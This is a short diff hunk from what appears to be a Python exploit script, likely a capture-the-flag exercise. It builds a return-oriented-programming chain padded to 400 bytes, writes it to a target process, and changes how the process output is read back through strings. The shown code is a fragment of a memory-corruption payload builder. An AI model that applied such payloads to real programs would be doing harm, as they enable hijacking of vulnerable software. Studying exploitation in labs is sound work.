@@ -23,5 +23,5 @@ buf = rop.call_chain_plt(
 buf += rop.fill(400, buf)
 
 p.write(buf)
-print p.strings()
+print p.pipe_output('strings', '-tx')
 p.close()
